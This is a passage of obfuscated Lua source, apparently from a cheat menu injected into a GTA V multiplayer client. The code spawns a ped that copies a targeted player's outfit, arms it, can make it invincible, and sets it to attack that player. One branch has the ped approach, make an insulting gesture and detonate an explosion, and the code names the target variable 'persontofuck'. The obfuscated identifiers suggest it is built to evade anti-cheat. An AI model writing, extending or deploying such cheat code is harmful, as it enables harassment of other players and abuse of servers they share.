                    local wrist = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 7)
                    local wrist_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 7)
                    local head_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 0)
                    local head_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 0)
                    local head_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 0)
                    local beard_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 1)
                    local beard_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 1)
                    local beard_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 1)
                    local hair_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 2)
                    local hair_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 2)
                    local hair_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 2)
                    local torso_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 3)
                    local torso_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 3)
                    local torso_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 3)
                    local legs_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 4)
                    local legs_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 4)
                    local legs_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 4)
                    local hands_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 5)
                    local hands_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 5)
                    local hands_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 5)
                    local foot_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 6)
                    local foot_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 6)
                    local foot_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 6)
                    local acc1_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 7)
                    local acc1_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 7)
                    local acc1_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 7)
                    local acc2_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 8)
                    local acc2_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 8)
                    local acc2_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 8)
                    local acc3_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 9)
                    local acc3_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 9)
                    local acc3_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 9)
                    local mask_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 10)
                    local mask_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 10)
                    local mask_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 10)
                    local aux_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 11)
                    local aux_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 11) 	
                    local aux_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 11)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 0, hat, hat_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 1, glasses, glasses_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 2, ear, ear_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 6, watch, watch_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 7, wrist, wrist_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 0, head_drawable, head_texture, head_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 1, beard_drawable, beard_texture, beard_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 2, hair_drawable, hair_texture, hair_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 3, torso_drawable, torso_texture, torso_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 4, legs_drawable, legs_texture, legs_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 5, hands_drawable, hands_texture, hands_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 6, foot_drawable, foot_texture, foot_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 7, acc1_drawable, acc1_texture, acc1_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 8, acc2_drawable, acc2_texture, acc2_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 9, acc3_drawable, acc3_texture, acc3_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 10, mask_drawable, mask_texture, mask_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 11, aux_drawable, aux_texture, aux_palette)
                elseif ped == 102 then
                    local persontofuck = nlFXKkFxuKQAk.natives.GetPlayerPed(ClonedP)
                    local hat = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 0)
                    local hat_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 0)
                    local glasses = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 1)
                    local glasses_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 1)
                    local ear = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 2)
                    local ear_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 2)
                    local watch = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 6)
                    local watch_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 6)
                    local wrist = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 7)
                    local wrist_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 7)
                    local head_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 0)
                    local head_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 0)
                    local head_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 0)
                    local beard_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 1)
                    local beard_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 1)
                    local beard_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 1)
                    local hair_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 2)
                    local hair_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 2)
                    local hair_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 2)
                    local torso_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 3)
                    local torso_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 3)
                    local torso_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 3)
                    local legs_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 4)
                    local legs_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 4)
                    local legs_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 4)
                    local hands_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 5)
                    local hands_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 5)
                    local hands_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 5)
                    local foot_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 6)
                    local foot_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 6)
                    local foot_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 6)
                    local acc1_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 7)
                    local acc1_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 7)
                    local acc1_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 7)
                    local acc2_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 8)
                    local acc2_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 8)
                    local acc2_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 8)
                    local acc3_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 9)
                    local acc3_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 9)
                    local acc3_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 9)
                    local mask_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 10)
                    local mask_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 10)
                    local mask_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 10)
                    local aux_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 11)
                    local aux_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 11) 	
                    local aux_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 11)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 0, hat, hat_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 1, glasses, glasses_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 2, ear, ear_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 6, watch, watch_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 7, wrist, wrist_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 0, head_drawable, head_texture, head_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 1, beard_drawable, beard_texture, beard_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 2, hair_drawable, hair_texture, hair_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 3, torso_drawable, torso_texture, torso_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 4, legs_drawable, legs_texture, legs_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 5, hands_drawable, hands_texture, hands_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 6, foot_drawable, foot_texture, foot_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 7, acc1_drawable, acc1_texture, acc1_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 8, acc2_drawable, acc2_texture, acc2_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 9, acc3_drawable, acc3_texture, acc3_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 10, mask_drawable, mask_texture, mask_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 11, aux_drawable, aux_texture, aux_palette)
                end
                nlFXKkFxuKQAk.natives.GiveWeaponToPed(pedc, RfPsUKHSFWJuBEJuz.rE.LumHash(wep), 200, false, true)
                nlFXKkFxuKQAk.natives.TaskCombatPed(pedc, targetped, 0, 16)
                if isgod then
                    nlFXKkFxuKQAk.natives.SetEntityInvincible(pedc, true)
                end
                RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                    while true do
                        if target == nil then
                            RfPsUKHSFWJuBEJuz.rE.pront('no target')
                            return
                        else
                            if nlFXKkFxuKQAk.natives.IsPedDeadOrDying(targetped, 1) then
                                if not nlFXKkFxuKQAk.natives.IsPedDeadOrDying(pedc, 1) then
                                    if isexploade then
                                        local finalloc = nlFXKkFxuKQAk.natives.GetEntityCoords(pedc, false)
                                        nlFXKkFxuKQAk.natives.SetEntityInvincible(pedc, false)
                                        nlFXKkFxuKQAk.natives.AddExplosion(finalloc.x, finalloc.y, finalloc.z, 2, 100000.0, true, false, 0)
                                        return
                                    end
                                    local finalloc = nlFXKkFxuKQAk.natives.GetEntityCoords(pedc, false)
                                    nlFXKkFxuKQAk.natives.TaskSmartFleeCoord(pedc, finalloc.x, finalloc.y, finalloc.z, 1000.0, 1000.0, false, false)
                                    return
                                else
                                    return
                                end
                            else
                                nlFXKkFxuKQAk.natives.SetPedCombatAbility(pedc, 2)
                                nlFXKkFxuKQAk.natives.SetPedCombatMovement(pedc, 3)
                                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 0, 2.0)
                                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 1, 6.0)
                                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 3, 0.5)
                                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 4, 2.0)
                                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 5, 2.0)
                                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 11, 2.0)
                                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 13, 0.01)
                                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 14, 0.01)
                                nlFXKkFxuKQAk.natives.SetPedAccuracy(pedc, hitc)
                                nlFXKkFxuKQAk.natives.SetPedFiringPattern(pedc, -957453492)
                                nlFXKkFxuKQAk.natives.SetPedInfiniteAmmoClip(pedc, true)
                            end
                        end
                        RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                    end
                end)
            elseif method == 2 then
                local dict = "anim@mp_player_intupperfinger"
                nlFXKkFxuKQAk.natives.RequestAnimDict(dict)
                local _, zcord = nlFXKkFxuKQAk.natives.GetGroundZFor_3dCoord(targetloc.x + 5.0, targetloc.y + 5.0, targetloc.z, 0)
                local pedc = nlFXKkFxuKQAk.natives.CreatePed(4, characterModel, targetloc.x + 5.0, targetloc.y + 5.0, zcord, 0.0, true, false)
                nlFXKkFxuKQAk.natives.TaskCombatPed(pedc, targetped, 0, 16)
                if isgod then
                    nlFXKkFxuKQAk.natives.SetEntityInvincible(pedc, true)
                end
                if ped == 100 then
                    nlFXKkFxuKQAk.natives.SetPedDefaultComponentVariation(pedc)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 6, 6, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 4, 21, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 11, 15, 2, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 8, 15, 1, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 9, 16, 2, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 3, 15, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 1, 115, 6, 0)
                    nlFXKkFxuKQAk.natives.SetPedHeadBlendData(pedc,2,1,3,19,2,1,2,5,2,false)
                elseif ped == 101 then
                    local persontofuck = nlFXKkFxuKQAk.natives.GetPlayerPed(target)
                    local hat = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 0)
                    local hat_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 0)
                    local glasses = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 1)
                    local glasses_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 1)
                    local ear = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 2)
                    local ear_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 2)
                    local watch = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 6)
                    local watch_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 6)
                    local wrist = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 7)
                    local wrist_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 7)
                    local head_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 0)
                    local head_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 0)
                    local head_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 0)
                    local beard_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 1)
                    local beard_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 1)
                    local beard_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 1)
                    local hair_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 2)
                    local hair_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 2)
                    local hair_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 2)
                    local torso_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 3)
                    local torso_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 3)
                    local torso_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 3)
                    local legs_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 4)
                    local legs_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 4)
                    local legs_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 4)
                    local hands_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 5)
                    local hands_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 5)
                    local hands_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 5)
                    local foot_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 6)
                    local foot_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 6)
                    local foot_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 6)
                    local acc1_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 7)
                    local acc1_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 7)
                    local acc1_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 7)
                    local acc2_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 8)
                    local acc2_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 8)
                    local acc2_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 8)
                    local acc3_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 9)
                    local acc3_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 9)
                    local acc3_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 9)
                    local mask_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 10)
                    local mask_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 10)
                    local mask_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 10)
                    local aux_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 11)
                    local aux_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 11) 	
                    local aux_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 11)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 0, hat, hat_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 1, glasses, glasses_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 2, ear, ear_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 6, watch, watch_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 7, wrist, wrist_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 0, head_drawable, head_texture, head_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 1, beard_drawable, beard_texture, beard_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 2, hair_drawable, hair_texture, hair_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 3, torso_drawable, torso_texture, torso_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 4, legs_drawable, legs_texture, legs_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 5, hands_drawable, hands_texture, hands_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 6, foot_drawable, foot_texture, foot_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 7, acc1_drawable, acc1_texture, acc1_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 8, acc2_drawable, acc2_texture, acc2_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 9, acc3_drawable, acc3_texture, acc3_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 10, mask_drawable, mask_texture, mask_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 11, aux_drawable, aux_texture, aux_palette)
                elseif ped == 102 then
                    local persontofuck = nlFXKkFxuKQAk.natives.GetPlayerPed(ClonedP)
                    local hat = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 0)
                    local hat_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 0)
                    local glasses = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 1)
                    local glasses_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 1)
                    local ear = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 2)
                    local ear_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 2)
                    local watch = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 6)
                    local watch_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 6)
                    local wrist = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 7)
                    local wrist_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 7)
                    local head_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 0)
                    local head_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 0)
                    local head_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 0)
                    local beard_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 1)
                    local beard_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 1)
                    local beard_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 1)
                    local hair_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 2)
                    local hair_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 2)
                    local hair_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 2)
                    local torso_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 3)
                    local torso_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 3)
                    local torso_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 3)
                    local legs_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 4)
                    local legs_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 4)
                    local legs_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 4)
                    local hands_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 5)
                    local hands_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 5)
                    local hands_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 5)
                    local foot_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 6)
                    local foot_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 6)
                    local foot_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 6)
                    local acc1_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 7)
                    local acc1_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 7)
                    local acc1_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 7)
                    local acc2_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 8)
                    local acc2_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 8)
                    local acc2_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 8)
                    local acc3_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 9)
                    local acc3_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 9)
                    local acc3_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 9)
                    local mask_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 10)
                    local mask_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 10)
                    local mask_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 10)
                    local aux_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 11)
                    local aux_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 11) 	
                    local aux_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 11)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 0, hat, hat_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 1, glasses, glasses_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 2, ear, ear_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 6, watch, watch_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 7, wrist, wrist_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 0, head_drawable, head_texture, head_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 1, beard_drawable, beard_texture, beard_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 2, hair_drawable, hair_texture, hair_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 3, torso_drawable, torso_texture, torso_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 4, legs_drawable, legs_texture, legs_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 5, hands_drawable, hands_texture, hands_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 6, foot_drawable, foot_texture, foot_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 7, acc1_drawable, acc1_texture, acc1_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 8, acc2_drawable, acc2_texture, acc2_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 9, acc3_drawable, acc3_texture, acc3_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 10, mask_drawable, mask_texture, mask_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 11, aux_drawable, aux_texture, aux_palette)
                end
                RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                    while true do
                        if target == nil then
                            RfPsUKHSFWJuBEJuz.rE.pront('no target')
                            return
                        else
                            while not nlFXKkFxuKQAk.natives.HasAnimDictLoaded(dict) do
                                RfPsUKHSFWJuBEJuz.rE.LumWait(10)
                            end
                            local pedcords = nlFXKkFxuKQAk.natives.GetEntityCoords(pedc, false)
                            local targetloc = nlFXKkFxuKQAk.natives.GetEntityCoords(targetped, false)
                            local distancetok = nlFXKkFxuKQAk.natives.GetDistanceBetweenCoords(pedcords.x, pedcords.y, pedcords.z, targetloc.x, targetloc.y, targetloc.z, false)
                            if distancetok <= 1.7 then
                                nlFXKkFxuKQAk.natives.ClearPedTasks(pedc)
                                nlFXKkFxuKQAk.natives.ClearPedTasksImmediately(pedc)
                                nlFXKkFxuKQAk.natives.TaskPlayAnim(pedc, dict, "idle_a_fp", 8.0, 8.0, -1, 50, 0, false, false, false)
                                RfPsUKHSFWJuBEJuz.rE.LumWait(500)
                                nlFXKkFxuKQAk.natives.SetEntityInvincible(pedc, false)
                                nlFXKkFxuKQAk.natives.AddExplosion(pedcords.x, pedcords.y, pedcords.z, 2, 100000.0, true, false, 0)
                                return
                            end
                        end
                        RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                    end
                end)
            elseif method == 3 then
                local targetloc = nlFXKkFxuKQAk.natives.GetEntityCoords(targetped, false)
